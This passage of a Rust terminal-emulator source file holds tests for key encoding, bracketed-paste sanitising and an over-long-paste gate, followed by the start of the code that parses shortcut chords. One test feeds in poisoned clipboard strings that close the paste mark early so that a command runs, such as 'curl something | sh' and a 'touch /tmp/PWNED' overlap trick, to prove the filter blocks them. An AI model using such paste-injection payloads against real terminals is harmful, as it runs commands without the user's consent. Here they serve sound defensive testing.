            alt: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::D, ctrl_alt), None);
        assert_eq!(chord_of(Key::Enter, Modifiers::ALT), None);
    }

    #[test]
    fn ctrl_with_a_key_that_is_not_a_letter_falls_to_the_usual_table() {
        // Staying mute here would turn Ctrl+Enter into a dead key, when what a
        // terminal sends is exactly the same as without Ctrl.
        assert_eq!(press_with_ctrl(Key::Enter), Some(vec![0x0D]));
        assert_eq!(press_with_ctrl(Key::Backspace), Some(vec![0x7F]));
        assert_eq!(press_with_ctrl(Key::ArrowUp), Some(b"\x1b[A".to_vec()));
        // And what is in neither of the two tables still sends nothing.
        assert_eq!(press_with_ctrl(Key::F1), None);
    }

    #[test]
    fn releasing_a_key_sends_nothing() {
        let release = Event::Key {
            key: Key::Enter,
            physical_key: None,
            pressed: false,
            repeat: false,
            modifiers: Modifiers::NONE,
        };
        assert!(bytes(&release).is_none());
    }

    #[test]
    fn holding_a_key_down_keeps_sending() {
        // The repeat is what makes holding an arrow down move the cursor. Filtering it
        // would break something that shows immediately.
        let repeated = Event::Key {
            key: Key::ArrowDown,
            physical_key: None,
            pressed: true,
            repeat: true,
            modifiers: Modifiers::NONE,
        };
        assert_eq!(
            bytes(&repeated).map(|b| b.into_owned()),
            Some(b"\x1b[B".to_vec())
        );
    }

    #[test]
    fn the_keys_this_milestone_leaves_out_do_not_invent_bytes() {
        // They are out on purpose, and what matters is that it shows as silence and not as a wrong
        // byte that the program inside would interpret as something else.
        assert_eq!(press(Key::F1), None);
        assert_eq!(press(Key::Home), None);
        assert_eq!(press(Key::PageUp), None);
        assert_eq!(press(Key::Delete), None);
    }

    #[test]
    fn without_a_mark_the_breaks_imitate_the_enter_key() {
        // Without a mark the program does not tell the pasted from the typed, so the key has to be
        // imitated: Enter sends carriage return. Sending 0x0A would be a different key.
        assert_eq!(paste("ls\n", false), b"ls\r");
        assert_eq!(paste("a\nb", false), b"a\rb");
        assert_eq!(paste("no breaks", false), b"no breaks");
    }

    #[test]
    fn with_a_mark_the_breaks_go_as_is_and_not_as_carriage_return() {
        // **This was discovered by looking at the screen, not a test.** With a mark, a carriage return is not
        // «the Enter key»: it is a control character inside a text that the program is going to insert
        // literally. Pasting two commands gave «echo one ▯ echo two» with a box in the middle, and on pressing
        // Enter the shell printed the box. The break has to go as a break and let the program decide.
        assert_eq!(
            paste("echo one\necho two", true),
            b"\x1b[200~echo one\necho two\x1b[201~"
        );
        // A lone carriage return in the text is worth the same as a break, here too.
        assert_eq!(paste("a\rb", true), b"\x1b[200~a\nb\x1b[201~");
    }

    #[test]
    fn with_the_program_requesting_it_the_text_goes_marked_as_pasted() {
        assert_eq!(paste("ls\n", true), b"\x1b[200~ls\n\x1b[201~");
    }

    #[test]
    fn the_text_cannot_close_its_own_mark() {
        // **It is the edge that turns pasting into executing without Enter.** A clipboard copied from
        // anywhere can bring the closing sequence hidden; if it slipped through, it would close the
        // mark on its own and whatever came behind would arrive as typed by the user. The
        // terminal engine filters nothing — it was checked—, so if this does not do it, no one does.
        //
        // **The second case is an attack that worked** and that an adversarial reviewer found: with
        // the previous filtering —search and delete the sequence— the pieces on the sides joined on
        // removing the middle one and formed a new closing that no one looked at any more. That is why it now asserts
        // over the invariant and not over a case: **in the body there is not a single escape**.
        let poisons = [
            "innocent\x1b[201~; curl something | sh\n",
            // The overlap: `ESC[2` + the closing + `01~`.
            "\x1b[2\x1b[201~01~; touch /tmp/PWNED\n",
        ];

        for poison in poisons {
            let bracketed = String::from_utf8(paste(poison, true)).expect("it is text");
            let body = bracketed
                .strip_prefix("\x1b[200~")
                .and_then(|s| s.strip_suffix("\x1b[201~"))
                .unwrap_or_else(|| panic!("the mark does not wrap what it should: {bracketed:?}"));
            assert!(
                !body.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\n'),
                "a control character stayed inside the mark: {body:?}"
            );

            // And without marking either: the mode is consulted when composing and can change right after.
            let stripped = String::from_utf8(paste(poison, false)).expect("it is text");
            assert!(
                !stripped
                    .bytes()
                    .any(|b| b < 0x20 && b != b'\t' && b != b'\r'),
                "a control character got through unmarked: {stripped:?}"
            );
        }
    }

    #[test]
    fn the_clipboard_controls_do_not_reach_the_kernel() {
        // **The wrapper does not protect from this and that is why the filter is needed.** Control
        // characters are processed by the kernel's line discipline, which sees the bytes before the
        // program: 0x03 interrupts, 0x1a suspends the shell, 0x1c triggers a dump and 0x04 closes the
        // input. A hostile clipboard carries them without their being seen when pasting them.
        let hostile = "echo hello\x03\x1a\x1c\x04 and continues\n";

        for bracketed in [true, false] {
            let bytes_out = paste(hostile, bracketed);
            let body = if bracketed {
                &bytes_out[6..bytes_out.len() - 6]
            } else {
                &bytes_out[..]
            };
            for byte in body {
                assert!(
                    *byte >= 0x20 || *byte == b'\t' || *byte == b'\n' || *byte == b'\r',
                    "a control reached the program: {byte:#04x} in {body:?}"
                );
            }
        }
    }

    #[test]
    fn the_tab_and_the_breaks_survive_the_filter() {
        // They are the three controls a pasted text really carries, and removing them would turn pasting
        // a table or a script into pasting a single run-on line.
        assert_eq!(paste("a\tb\nc", false), b"a\tb\rc");
        assert_eq!(paste("a\tb\nc", true), b"\x1b[200~a\tb\nc\x1b[201~");
        // A lone carriage return is worth the same as a break: the desktop already normalized the pairs.
        assert_eq!(paste("a\rb", false), b"a\rb");
    }

    #[test]
    fn pasting_nothing_sends_nothing_not_even_an_empty_mark() {
        assert!(paste("", true).is_empty());
        assert!(paste("", false).is_empty());
        // A text that was only controls comes to nothing, and it does not send the empty mark either.
        assert!(paste("\x1b\x1b\x1b", true).is_empty());
        assert!(paste("\x03\x04\x1a", true).is_empty());

        // **But what remains after removing the escape IS sent, and that is correct.** `[201~` without
        // its escape in front is plain text: it is written on the line, it closes nothing. Dropping it would be
        // eating characters the user pasted on purpose.
        let left = String::from_utf8(paste("\x1b[201~", true)).expect("it is text");
        assert_eq!(left, "\x1b[200~[201~\x1b[201~");
    }

    #[test]
    fn an_event_that_is_not_from_the_keyboard_is_ignored() {
        assert!(bytes(&Event::WindowFocused(true)).is_none());
    }

    // ── The paste that is held instead of sent ───────────────────────────────────────────────────

    /// The boundary this platform declares, or **nothing** — and on nothing every test below stands
    /// down instead of inventing a number.
    ///
    /// **Not one of them writes `4 095`.** That figure is one kernel's compile-time constant (see
    /// [`the_longest_line_a_reader_keeps`], which says at length that it is not a contract): a test
    /// that spelled it out would be asserting the platform instead of the fix, and it would go green
    /// on a machine where the gate does nothing at all. Every size below is derived from this
    /// function, so on a kernel with another number they still say the same thing.
    fn the_boundary_or_stand_down() -> Option<usize> {
        let boundary = the_longest_line_a_reader_keeps();
        if boundary.is_none() {
            eprintln!(
                "this platform declares no boundary, so there is no gate here: standing down"
            );
        }
        if let Some(boundary) = boundary {
            assert!(
                boundary > "\x1b[200~\x1b[201~".len() * 2,
                "the declared boundary is {boundary}, which is too small to build a paste around: \
                 the tests below would be measuring their own arithmetic"
            );
        }
        boundary
    }

    /// **That Linux has a gate at all**, which is the one thing no other test in this module can
    /// say: they all stand down when there is no boundary, so a
    /// [`the_longest_line_a_reader_keeps`] that quietly answered «nothing» would turn the whole
    /// feature off and leave every one of them green.
    ///
    /// It still writes no number. It asks the two questions that matter — that a boundary is
    /// declared, and that going over it really holds — and derives the size from the answer.
    #[test]
    #[cfg(target_os = "linux")]
    fn on_linux_the_gate_is_declared_and_it_fires() {
        let boundary = the_longest_line_a_reader_keeps()
            .expect("Linux was measured and has a boundary: with none, this module tests nothing");

        let mut destination = Vec::new();
        assert!(
            hold_from(&"x".repeat(boundary + 1), false, &mut destination).is_some(),
            "the boundary is declared and going over it changes nothing: the gate is dead"
        );
        assert!(
            destination.is_empty(),
            "the over-long paste was written anyway"
        );
    }

    /// A paste put through the gate with **no question already standing**, and what it left held.
    ///
    /// The tests that care about a question already standing call [`paste_or_hold`] themselves.
    fn hold_from(text: &str, bracketed: bool, destination: &mut Vec<u8>) -> Option<HeldPaste> {
        let mut held = None;
        paste_or_hold(text, bracketed, destination, &mut held);
        held
    }

    /// One pass of the loop, with a key pressed in it or with nobody touching anything.
    fn a_pass_with(
        ctx: &Context,
        key: Option<(Key, Modifiers)>,
        held: &mut Option<HeldPaste>,
        keystrokes: &mut Vec<u8>,
    ) {
        let events = key
            .map(|(key, modifiers)| {
                vec![Event::Key {
                    key,
                    physical_key: None,
                    pressed: true,
                    repeat: false,
                    modifiers,
                }]
            })
            .unwrap_or_default();
        let input = eframe::egui::RawInput {
            events,
            ..Default::default()
        };
        // **`run_ui` and not `run_logic`.** The logic-only pass documents that it does not interpret
        // the ui input at all: the key would never reach `InputState` and every assertion below
        // would be met by a pass where nobody pressed anything.
        //
        // And the body runs once, the way this crate's other pass helper does it: `run_ui` takes an
        // `FnMut` and egui may repeat the pass, and a second run would empty the buffer the first
        // one had just filled.
        let mut once = Some(());
        ctx.run_ui(input, |_ui| {
            if once.take().is_some() {
                start_the_keys(ctx, held, keystrokes, false);
            }
        })
        .drop_without_applying_deltas();
    }

    #[test]
    fn a_line_that_a_reader_keeps_whole_is_appended_and_nothing_is_held() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // Exactly as long as a reader keeps: the last size that must **not** be interfered with.
        // One character less and the gate could be off by one without a test noticing.
        let text = "x".repeat(boundary);
        let mut destination = b"what this pass already had".to_vec();

        let held = hold_from(&text, false, &mut destination);

        assert!(
            held.is_none(),
            "a line that fits was held: the gate asks a question where there is nothing to ask"
        );
        assert_eq!(
            destination,
            [b"what this pass already had".as_slice(), text.as_bytes()].concat(),
            "what fits has to be appended to what the pass was already sending, not replace it"
        );
    }

    #[test]
    fn one_character_over_the_boundary_and_not_a_byte_reaches_the_program() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **This is the whole bug in one line.** At one character over, the line discipline keeps the
        // first ones and closes the line as if it had ended there, so a shell runs a different
        // command from the one on screen. The effect the fix has to have is not that a value comes
        // back: it is that **the destination never sees the bytes**.
        let text = "x".repeat(boundary + 1);
        let untouched = b"what this pass already had".to_vec();
        let mut destination = untouched.clone();

        let held = hold_from(&text, false, &mut destination);

        assert!(
            destination == untouched,
            "the paste was written anyway: the destination grew from {} to {} bytes, and those are \
             the bytes that get truncated into another command",
            untouched.len(),
            destination.len()
        );
        let held = held.expect("a line over the boundary went through with nothing asked");
        assert_eq!(
            held.longest(),
            boundary + 1,
            "the held paste misreports how long its offending line is, which is what is put to the \
             person deciding"
        );
    }

    #[test]
    fn a_second_over_long_paste_does_not_take_the_first_one_away_in_silence() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **This is the bug one layer up.** If the second question replaced the first, the first
        // paste would go without a word — which is the silent loss the whole thing exists to stop.
        // The standing question keeps its own bytes and counts the ones turned away.
        let first = "a".repeat(boundary + 1);
        let second = "b".repeat(boundary + 1);
        let mut held = None;
        let mut destination = Vec::new();

        paste_or_hold(&first, false, &mut destination, &mut held);
        paste_or_hold(&second, false, &mut destination, &mut held);

        assert!(
            destination.is_empty(),
            "one of the two was written to the program anyway: {} bytes",
            destination.len()
        );
        let standing = held.expect("nothing is being asked about at all");
        // **The second half of this test's own name.** Keeping the first paste is only half of «not
        // in silence»: the second one did not happen either, and if nothing says so it has gone the
        // same way. Measured — without this assertion, making the counting a no-op left the whole
        // file green over a live silent loss.
        let said = standing.sentence();
        assert!(
            said.contains("not taken"),
            "a paste arrived while this one was waiting and nothing says it did: {said:?}"
        );
        assert!(
            standing.send_anyway(false) == paste(&first, false),
            "the second paste replaced the first, and the first went with nothing said"
        );
    }

    #[test]
    fn each_paste_turned_away_is_counted_and_not_just_the_first() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // A count that saturates at one is the same silence for everything after it.
        let long = "a".repeat(boundary + 1);
        let mut held = None;
        let mut destination = Vec::new();
        for _ in 0..3 {
            paste_or_hold(&long, false, &mut destination, &mut held);
        }
        let said = held
            .expect("nothing is being asked about at all")
            .sentence();
        assert!(
            // **The rendered count and not a loose digit.** The sentence also carries the line's
            // length and the boundary, so `contains('2')` would pass on a kernel whose numbers
            // happen to hold a two — whatever the counter did.
            said.contains("2 further pastes") && said.contains("not taken") && !said.contains("20"),
            "two pastes were turned away and the question does not say how many: {said:?}"
        );
    }

    #[test]
    fn a_paste_that_fits_goes_through_while_a_question_stands_and_leaves_it_where_it_was() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **A standing question does not deafen the console.** Whatever else is pasted while it
        // waits is an ordinary paste and has to arrive; and because it arrived, it is **not** one of
        // the ones turned away — a count that took it in would tell the person a paste was lost that
        // was never lost, which is the same defect the other way round.
        let long = "a".repeat(boundary + 1);
        let short = "echo short\n";
        let mut held = None;
        let mut destination = Vec::new();

        paste_or_hold(&long, false, &mut destination, &mut held);
        paste_or_hold(short, false, &mut destination, &mut held);

        assert!(
            destination == paste(short, false),
            "the paste that fits did not arrive as an ordinary paste: {} bytes instead of {}",
            destination.len(),
            paste(short, false).len()
        );
        let standing = held.expect("the standing question was taken away by a paste that fits");
        let said = standing.sentence();
        assert!(
            !said.contains("not taken"),
            "a paste that went through was counted as turned away: {said:?}"
        );
        assert!(
            standing.send_anyway(false) == paste(&long, false),
            "the standing question no longer holds the paste it was asked about"
        );
    }

    #[test]
    fn saying_yes_sends_exactly_what_would_have_been_sent() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // With a control character in it and with a break: saying yes hands over a **properly
        // composed** paste — filtered and wrapped — and never the raw text.
        let text = format!("{}\x03\techo\nand more", "x".repeat(boundary + 1));

        // Only an unwrapped paste is ever held — a wrapped one cannot be truncated — so this is the
        // only mode a question can be asked in.
        for sent_in in [false, true] {
            let held = hold_from(&text, false, &mut Vec::new())
                .expect("a line over the boundary was not held");

            assert!(
                held.send_anyway(sent_in) == paste(&text, sent_in),
                "saying yes sent something other than the paste itself (sent in: {sent_in})"
            );
        }
    }

    #[test]
    fn the_paste_is_composed_against_the_mode_it_goes_out_in_and_not_the_one_it_waited_in() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **This is the difference between a paste and an execution.** A break is composed as `\r`
        // when the program has not asked for bracketed paste and as `\n` when it has, and the mode
        // moves underneath a standing question: `bash` turns the wrapping off while a command runs
        // and on again at its prompt. Bytes composed unwrapped and delivered to a prompt that has
        // since turned it on make the line editor **execute each line as it arrives**, which is this
        // ticket's own bug arriving through its fix.
        let text = format!("{}\nsecond line", "x".repeat(boundary + 1));

        // Held unwrapped — the only mode a question is ever asked in — and answered at a prompt that
        // has since turned the wrapping on, which is what `readline` does when a command finishes.
        let (held_in, sent_in) = (false, true);
        {
            let held = hold_from(&text, held_in, &mut Vec::new())
                .expect("a line over the boundary was not held");
            assert!(
                held.the_mode_moved(sent_in),
                "the test is not exercising a mode change at all"
            );

            let sent = held.send_anyway(sent_in);

            assert!(
                sent == paste(&text, sent_in),
                "the paste went out composed for the mode it was held in, not the one it was sent in"
            );
            assert!(
                sent != paste(&text, held_in),
                "the two modes compose the same bytes, so this test proves nothing"
            );
        }
    }

    #[test]
    fn a_paste_of_many_lines_goes_through_however_much_of_it_there_is() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **This is what separates «too long» from «too much».** The line discipline delivers a line
        // on each break, so eight lines of the boundary's length are eight deliveries and not one
        // truncation. A gate that looked at the paste's size instead of at its longest line would
        // hold this — and holding an ordinary multi-line paste is a worse product than the bug.
        let line = "x".repeat(boundary);
        let text = [line.as_str(); 8].join("\n");
        let mut destination = Vec::new();

        let held = hold_from(&text, false, &mut destination);

        assert!(
            held.is_none(),
            "«too much» was taken for «too long»: a paste of {} bytes whose every line fits was held",
            text.len()
        );
        assert!(
            destination == paste(&text, false),
            "the paste went through changed: {} bytes instead of {}",
            destination.len(),
            paste(&text, false).len()
        );
        assert!(
            destination.len() > boundary * 4,
            "the load did not end up far over the boundary, so this test proves nothing"
        );
    }

    #[test]
    fn a_break_closes_a_line_whichever_of_the_two_terminators_it_comes_out_as() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **The two directions, and each one is a different mutation.** An unwrapped paste sends a
        // break as `\r` and a wrapped one as `\n`, and the line discipline closes a line on either —
        // `ICRNL` maps the first to the second. Measuring only one of the two terminators is a hold
        // on an entirely ordinary paste.
        // Short of the boundary by the two markers, so the wrapped case fits too and the only thing
        // this test can fail on is the terminator. Whether the boundary itself is off by one is the
        // business of the two tests above, and that the markers count is the business of the one
        // below.
        let half = "x".repeat(boundary - "\x1b[200~\x1b[201~".len());
        for (bracketed, in_the_text, comes_out_as) in [(false, '\n', "\\r"), (true, '\r', "\\n")] {
            let text = format!("{half}{in_the_text}{half}");
            let mut destination = Vec::new();

            let held = hold_from(&text, bracketed, &mut destination);

            assert!(
                held.is_none(),
                "the break was not counted as one: composed it comes out as {comes_out_as}, and the \
                 two halves were measured as a single line of {}",
                held.map_or(0, |paste| paste.longest())
            );
            assert!(
                !destination.is_empty(),
                "nothing was sent at all (bracketed: {bracketed})"
            );
        }

        // The control that gives the two assertions above their meaning: **the same two halves with
        // no break between them are one line, and that one is held.** Without this, a gate that never
        // holds anything would pass the loop.
        let with_no_break = "x".repeat(boundary * 2);
        let mut destination = Vec::new();
        assert!(
            hold_from(&with_no_break, false, &mut destination).is_some(),
            "the halves are not long enough together to be over the boundary: the loop above proves \
             nothing"
        );
        assert!(destination.is_empty(), "the held paste was written anyway");
    }

    #[test]
    fn the_line_that_decides_is_the_longest_one_and_not_the_first() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **A live silent truncation, found by mutating `.max()` into `.next()`.** Every other test
        // here puts the long line first or makes them all equal, so nothing distinguished «the first
        // line» from «the longest» — and a paste of `ls` followed by five thousand characters would
        // have sailed through the gate and had its second line cut, which is the whole bug.
        let text = format!("ls\n{}", "x".repeat(boundary + 1));
        let mut destination = Vec::new();
        let mut held = None;

        paste_or_hold(&text, false, &mut destination, &mut held);

        assert!(
            held.is_some(),
            "the long line was not the first one, so the gate never looked at it"
        );
        assert!(
            destination.is_empty(),
            "it went to the program anyway: {} bytes",
            destination.len()
        );
    }

    #[test]
    fn the_question_carries_the_two_numbers_somebody_decides_with() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **The numbers, not just the words.** Reporting both as zero — «a line of 0 bytes… keeps
        // only about 0» — used to leave every test green: `longest()` was asserted and the sentence
        // built from it was not, which is this project's first disguise exactly.
        let over = boundary + 7;
        let mut held = None;
        paste_or_hold(&"x".repeat(over), false, &mut Vec::new(), &mut held);
        let said = held.expect("nothing was held").sentence();

        assert!(
            said.contains(&over.to_string()),
            "the question does not say how long the line is: {said:?}"
        );
        assert!(
            said.contains(&boundary.to_string()),
            "the question does not say what a reader keeps: {said:?}"
        );
    }

    #[test]
    fn a_lone_held_paste_does_not_claim_another_one_was_turned_away() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // Only the presence of that clause was ever pinned, never its absence — so a sentence that
        // always claimed a paste had been turned away passed every test.
        let mut held = None;
        paste_or_hold(&"x".repeat(boundary + 1), false, &mut Vec::new(), &mut held);
        let said = held.expect("nothing was held").sentence();

        assert!(
            !said.contains("not taken"),
            "one paste was held and the question says another was turned away: {said:?}"
        );
    }

    #[test]
    fn a_wrapped_paste_is_never_held_however_long_its_line_is() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **The gate must not fire where the loss cannot happen.** A program only turns the paste
        // markers on if it handles pastes itself, and every program that does is a line editor in
        // raw mode — where there is no canonical line buffer to truncate anything. Holding those
        // would put a false warning on the path that matters most in a terminal for hosting agents:
        // pasting a long prompt into an agent's console.
        let text = "x".repeat(boundary * 4);
        let mut destination = Vec::new();
        let mut held = None;

        paste_or_hold(&text, true, &mut destination, &mut held);

        assert!(
            held.is_none(),
            "a wrapped paste was held, and its line cannot be truncated at all"
        );
        assert!(
            destination == paste(&text, true),
            "the wrapped paste did not go through whole"
        );
        // And the same text unwrapped IS held, so this test is about the wrapping and not about the
        // text being somehow acceptable.
        let mut also = Vec::new();
        let mut unwrapped = None;
        paste_or_hold(&text, false, &mut also, &mut unwrapped);
        assert!(
            unwrapped.is_some() && also.is_empty(),
            "the same text unwrapped was not held, so the wrapping is not what this proves"
        );
    }

    #[test]
    fn every_pass_starts_with_an_empty_buffer_even_with_nothing_held() {
        // The emptying lives inside this function and not at the call site, so it is this function
        // that has to be caught not doing it. Without a held paste it is the only thing it does.
        let ctx = Context::default();
        let mut held = None;
        let mut keystrokes = b"what the previous pass sent".to_vec();

        a_pass_with(&ctx, None, &mut held, &mut keystrokes);

        assert!(
            keystrokes.is_empty(),
            "the previous pass's bytes were sent a second time: {keystrokes:?}"
        );
    }

    #[test]
    fn saying_yes_puts_the_paste_in_the_pass_and_nothing_else() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        let text = "x".repeat(boundary + 1);
        let mut held = hold_from(&text, false, &mut Vec::new());
        assert!(held.is_some(), "there is nothing held to answer");
        let ctx = Context::default();
        let mut keystrokes = b"what the previous pass sent".to_vec();

        a_pass_with(
            &ctx,
            Some((Key::Enter, Modifiers::CTRL)),
            &mut held,
            &mut keystrokes,
        );

        // **Both halves in one assertion, and that is the point.** Equal to the composed paste means
        // the buffer was emptied *and* the answer was resolved into it; the two apart are one
        // reordering away from a pass that resolves a paste and then wipes it.
        assert!(
            keystrokes == paste(&text, false),
            "the pass sent {} bytes and the paste is {}: either the previous pass's bytes are still \
             there, or the answer never landed",
            keystrokes.len(),
            paste(&text, false).len()
        );
        assert!(held.is_none(), "the paste stayed held after being sent");
    }

    #[test]
    fn saying_no_throws_the_paste_away_and_sends_nothing() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        let text = "x".repeat(boundary + 1);
        let mut held = hold_from(&text, false, &mut Vec::new());
        let ctx = Context::default();
        let mut keystrokes = b"what the previous pass sent".to_vec();

        a_pass_with(
            &ctx,
            Some((Key::Escape, Modifiers::NONE)),
            &mut held,
            &mut keystrokes,
        );

        assert!(
            keystrokes.is_empty(),
            "discarding sent {} bytes to the program",
            keystrokes.len()
        );
        assert!(
            held.is_none(),
            "the discarded paste is still being asked about"
        );
    }

    #[test]
    fn a_paste_nobody_has_answered_stays_held_and_is_not_sent() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        let text = "x".repeat(boundary + 1);
        let mut held = hold_from(&text, false, &mut Vec::new());
        let ctx = Context::default();
        let mut keystrokes = b"what the previous pass sent".to_vec();

        // A key that is neither of the two answers: the question is still open.
        a_pass_with(
            &ctx,
            Some((Key::A, Modifiers::NONE)),
            &mut held,
            &mut keystrokes,
        );

        assert!(
            held.is_some(),
            "the paste was dropped without anybody having answered"
        );
        assert!(
            keystrokes.is_empty(),
            "the pass sent something on its own: {keystrokes:?}"
        );
    }

    #[test]
    fn a_bare_enter_stays_the_programs_even_with_a_question_standing() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **The accident this chord exists to stop**, and it runs the other way from the obvious
        // one: with the question standing, somebody types a command at the prompt and presses Enter
        // to run it. If that Enter answered «send», the held paste would be appended onto the line
        // they just typed — a line over the boundary by construction, truncated by the kernel, which
        // is the incident this whole thing exists to prevent arriving through its own cure.
        let text = "x".repeat(boundary + 1);
        let mut held = hold_from(&text, false, &mut Vec::new());
        let ctx = Context::default();
        let mut keystrokes = Vec::new();

        a_pass_with(
            &ctx,
            Some((Key::Enter, Modifiers::NONE)),
            &mut held,
            &mut keystrokes,
        );

        assert!(
            held.is_some(),
            "a bare Enter answered the question, so it is not the program's any more"
        );
        assert!(
            keystrokes.is_empty(),
            "a bare Enter released the held paste: {keystrokes:?}"
        );
    }

    #[test]
    fn the_enter_that_answers_does_not_also_reach_the_program() {
        let Some(boundary) = the_boundary_or_stand_down() else {
            return;
        };
        // **With the question open, the chord that answers must not also get through** — it would run
        // whatever is on the shell's line, the opposite of what somebody answering meant. The answer
        // has to consume the key.
        let text = "x".repeat(boundary + 1);
        let mut held = hold_from(&text, false, &mut Vec::new());
        let ctx = Context::default();
        let mut keystrokes = Vec::new();
        let input = eframe::egui::RawInput {
            events: vec![Event::Key {
                key: Key::Enter,
                physical_key: None,
                pressed: true,
                repeat: false,
                modifiers: Modifiers::CTRL,
            }],
            ..Default::default()
        };

        let mut arrived = false;
        let mut still_there = true;
        let mut once = Some(());
        ctx.run_ui(input, |_ui| {
            if once.take().is_none() {
                return;
            }
            // The control: without it, a pass where the key never arrived would satisfy the
            // assertion below and publish «it was consumed» about an event nobody sent.
            arrived = ctx.input(|state| state.key_pressed(Key::Enter));
            start_the_keys(&ctx, &mut held, &mut keystrokes, false);
            still_there = ctx.input(|state| state.key_pressed(Key::Enter));
        })
        .drop_without_applying_deltas();

        assert!(
            arrived,
            "the Enter never reached the pass: this test proves nothing"
        );
        assert!(
            !still_there,
            "the Enter that answered the question is still in the pass, so the loop will send a \
             carriage return behind the paste"
        );
    }
}

// ── The application's shortcuts: which chord does what ───────────────────────────────────────────

/// What the application does when someone presses a chord of its own.
///
/// **Eleven, and they are the ones that exist today.** It is not an open list on purpose: each one has its condition and
/// its effect written where they happen, and an action with no effect would be a name that can be
/// configured and does nothing.
///
/// **Copy and paste are not here, and it is not an oversight.** Their chords **do not arrive as keys**: the
/// desktop resolves them earlier and they arrive as their own events, with no chord to reassign or to hand back
/// to the program inside. Paste has been verified since F2.6; copy was uncovered by a review of
/// this milestone, **by running it**, and along the way it found that until then copy did not copy: it interrupted the
/// program.
///
/// Of copy only the attention can be **turned off**, with `key.copy = none`; paste has no key.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Action {
    SplitRight,
    SplitDown,
    ClosePane,
    NewTab,
    CloseTab,
    PreviousTab,
    NextTab,
    ScrollPageUp,
    ScrollPageDown,
    ScrollToTop,
    ScrollToBottom,
}

impl Action {
    /// How it is written in the configuration file.
    pub fn as_written(self) -> &'static str {
        match self {
            Self::SplitRight => "split-right",
            Self::SplitDown => "split-down",
            Self::ClosePane => "close-pane",
            Self::NewTab => "new-tab",
            Self::CloseTab => "close-tab",
            Self::PreviousTab => "previous-tab",
            Self::NextTab => "next-tab",
            Self::ScrollPageUp => "scroll-page-up",
            Self::ScrollPageDown => "scroll-page-down",
            Self::ScrollToTop => "scroll-to-top",
            Self::ScrollToBottom => "scroll-to-bottom",
        }
    }

    /// The one written this way, if any.
    pub fn from_written(text: &str) -> Option<Self> {
        ALL.iter()
            .copied()
            .find(|action| action.as_written() == text)
    }
}

/// The eleven, to iterate over them.
pub const ALL: [Action; 11] = [
    Action::SplitRight,
    Action::SplitDown,
    Action::ClosePane,
    Action::NewTab,
    Action::CloseTab,
    Action::PreviousTab,
    Action::NextTab,
    Action::ScrollPageUp,
    Action::ScrollPageDown,
    Action::ScrollToTop,
    Action::ScrollToBottom,
];

/// A chord: the modifier keys needed, and the key.
///
/// **`Copy` and comparable by value**, because it is the key looked up in the table once per
/// keyboard event — the hottest path this project has.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct Chord {
    pub ctrl: bool,
    pub shift: bool,
    pub alt: bool,
    pub key: eframe::egui::Key,
}

impl Chord {
    /// The chord written this way, if possible.
    ///
    /// The parts are separated by `+`, in any order and regardless of case: `ctrl+shift+e`,
    /// `Shift+Prior`, `alt+f4`.
    pub fn from_written(text: &str) -> Option<Self> {
        let mut chord = Self {
            ctrl: false,
            shift: false,
            alt: false,
            key: eframe::egui::Key::Space,
        };
        let mut key = None;
        for part in text.split('+') {
            let part = part.trim();
            match part.to_ascii_lowercase().as_str() {
                "ctrl" | "control" => chord.ctrl = true,
                "shift" => chord.shift = true,
                "alt" => chord.alt = true,
                _ => {
                    // **A single key per chord.** Two would be a chord that cannot be pressed, and
                    // accepting it would leave the user expecting it to work.
                    if key.is_some() {
                        return None;
                    }
                    key = Some(key_named(part)?);
                }
            }
        }
        chord.key = key?;
        // **The copy and paste chords cannot be claimed, and accepting them would be promising something that
        // does not happen.** The desktop resolves them **before** they arrive: a copy arrives already
        // turned into a copy, and **without saying whether there was Shift**. A
        // `key.split-right = ctrl+shift+c` would be accepted, would never work, and whoever wrote it would
        // have no way to know why.
        //
        // **Paste is refused for a sharper reason since D33, and the difference matters to whoever
        // reads this next.** That chord no longer *never* arrives as a key: the vendored framework
        // stops swallowing it when the clipboard holds no text, so a `key.split-right = ctrl+v` would
        // now fire — **but only when there happened to be nothing to paste**. A binding that works
        // depending on what somebody copied last is worse than one that never works, and it cannot be
        // explained in the settings file. So the refusal stays and its reason has changed.
        if chord.ctrl && matches!(chord.key, eframe::egui::Key::C | eframe::egui::Key::V) {
            return None;
        }
        // **A chord with no modifier key stays with the program inside.** Allowing it would be
        // letting whoever configures take away the `a` from typing without anything warning them.
        (chord.ctrl || chord.shift || chord.alt).then_some(chord)
    }
}

/// The key written this way, if it exists.
///
/// **`Key::from_name` is case-sensitive and whoever writes a configuration file is not**: `F4` yes and
/// `f4` no, `PageUp` yes and `pageup` no. Checked by running it. So it is tried as is, and if not, with
/// the initial capitalized.
///
/// **And there are aliases.** `prior` and `next` are what the traditional terminals call them —and what
/// this project's document called them before anyone checked they do not exist—; `pgup`, `pgdn` and `esc` are the
/// abbreviations written on the key itself.
fn key_named(name: &str) -> Option<eframe::egui::Key> {
    use eframe::egui::Key;
    let alias = match name.to_ascii_lowercase().as_str() {
        "prior" | "pgup" => Some(Key::PageUp),
        "next" | "pgdn" => Some(Key::PageDown),
        "esc" => Some(Key::Escape),
        // **The arrows are also written with the arrow, and that is how the project's document publishes them.**
        // Not accepting them was a real mismatch between what was promised and what the code understood, caught
